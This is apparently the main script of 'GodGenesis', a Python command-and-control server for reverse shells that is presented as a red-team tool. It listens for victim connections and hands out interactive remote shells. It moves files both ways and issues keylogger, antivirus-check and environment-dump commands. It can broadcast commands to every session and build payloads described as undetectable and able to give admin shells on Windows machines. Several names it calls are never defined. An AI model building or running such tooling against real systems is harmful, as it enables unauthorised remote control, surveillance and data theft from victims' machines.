import os
import json
import socket
import getpass
import readline
import argparse
import threading
import subprocess
from assets.banner import banner
from assets.payload_builder import build_payload
from assets.helper import main_help, session_help



def completer(text, state):
    options = [i for i in commands if i.startswith(text)]
    if state < len(options):
        return options[state]
    else:
        return None

readline.parse_and_bind("tab: complete")
readline.set_completer(completer)


def sendtoall(target,data):
    json_data = json.dumps(data)
    connection_to_attacker.send(json_data.encode())


def server():
    while True:
        if stop_threads:
            break
        connection_to_victim.settimeout(1)
        try:
            target, ip = connection_to_victim.accept()
            targets.append(target)
            ips.append(ip)
            print(str(ip) + " Has Connected To GOD GENESIS." )
        except Exception as e:
            print("An error occurred:", e)


def shell(target, ip):

    def reliable_send(data):
        json_data = json.dumps(data)
        target.send(json_data.encode())


    def reliable_recv():
        data = ""
        while True:
            try:
                data = data + target.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue


    def download_file(file_name):
        f = open(file_name, 'wb')
    #target.settimeout(1)
        while True:
            chunk = target.recv(1024)
            if chunk.endswith('DONE'.encode()):
                f.write(chunk[:-4])
                f.close()
                break
            f.write(chunk)
        

    def upload_file(file_name):
        f = open(file_name, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            target.send(packet)
            packet = f.read(1024)
        target.send('DONE'.encode())


    while True:
        command = input(f"{target}> ")
        reliable_send(command)
        if command == 'terminate':
            target.close()
            targets.remove(target)
            ips.remove(target)
            break

        elif command == 'exit':
            break
            
        elif command == 'clear':
            os.system('clear')
        
        elif command[:3] == 'cd ':
            files = reliable_recv()
            print("Current Directory: ",files)
            pass
    
        elif command[:3] == 'pwd':
            files = reliable_recv()
            print("You are now at: ", files)

        elif command[:9] == 'download ':
            download_file(command[9:])

        elif command[:7] == 'upload ':
            upload_file(command[7:])

        elif command == 'user':
            detail = reliable_recv()
            print("The User Name Is : ",detail)
        
        elif command == 'info':
            result = reliable_recv()
            print(result)

        elif command == 'sc':
            result = reliable_recv()
            print(result)

        elif command == 'start':
            pass

        elif command == 'env':
            env_var = reliable_recv()
            print(env_var)

        elif command == 'av':
            result=reliable_recv()
            print(result)

        elif command == 'python3_install':
            pass     

        elif command == 'keylogger':
            print("keylogger started...")
            continue
        elif command == "help":
            main_help()
        else:
            result = reliable_recv()
            print(result)
            
    
"""
Creating and parsing arguments
-i/--ip for specifying attacker's  ip.
-p/--port for specifying port on attackers machine, where the connection will be established
"""                
def create_parser():
    parser = argparse.ArgumentParser("GodGenesis — Fʀᴏᴍ Tʜᴇ Hᴏᴜsᴇ Oғ IEM(BCA) Mᴀᴅᴇ Bʏ Tᴇᴀᴍ BCAN 420", epilog="God Genesis is a C2 server purely coded in Python3 created to help Red Teamers and Penetration Testers. Currently It only supports TCP reverse shell but wait a min, its a FUD and can give u admin shell from any targeted WINDOWS Machine.")
    parser.add_argument("mode", help="options:  [build, listen]", choices=["build", "listen"])
    parser.add_argument("-i", "--ip",help="ip")
    parser.add_argument("-p", "--port", type=int, help="port")
    parser.add_argument("-o", "--outfile", help="specify a name for the built payload")
    return parser
      

parser = create_parser()
args = parser.parse_args()

print(banner())
if __name__ == "__main__":
    if args.mode == "build":
        build_payload(args)
    elif args.mode == "listen":
        ips = []
        targets = []
        stop_threads = False
        connection_to_victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection_to_victim.bind((args.ip, args.port))
        connection_to_victim.listen(10)
        t1 = threading.Thread(target=server)
        t1.start()
        print(f"[+] Listening for incoming connections...\n")
        while True:
            command = input(f"┌──({getpass.getuser()}@GodGenesis-C2-Server)\n├──[~{os.getcwd()}]\n└╼ ")
            if command == "sessions -l":
                count = 0
                for ip in ips:
                    print("Session " + str(count) + " : " + str(ip))
                    count += 1
            elif command[:11] == "sessions -i":
                try:
                    num = int(command[12:])
                    targets_num = targets[num]
                    targets_ip = ips[num]
                    shell(targets_num, targets_ip)
                except:
                    print("GOD GENESIS doesn't recognize any session with that number")
                    
            elif command == 'clear':
                subprocess.run(['clear'], shell=False)
            elif command[:7] == 'sendall':
                x = len(targets)
                print(x)
                i = 0
                try:
                    while i < x:
                        tarnumber = targets[i]
                        print(tarnumber)
                        sendtoall(tarnumber, command)
                        i += 1
                except Exception as e:
                    print(f'Failed: {e}')
                
            elif command == 'shell_help':
                shell_help()
            elif command == 'help':
                session_help()
            else:
                print(f"Command Not Found: {command}")
    else:
        print("c2c.py: use '-h/--help' to show help message")
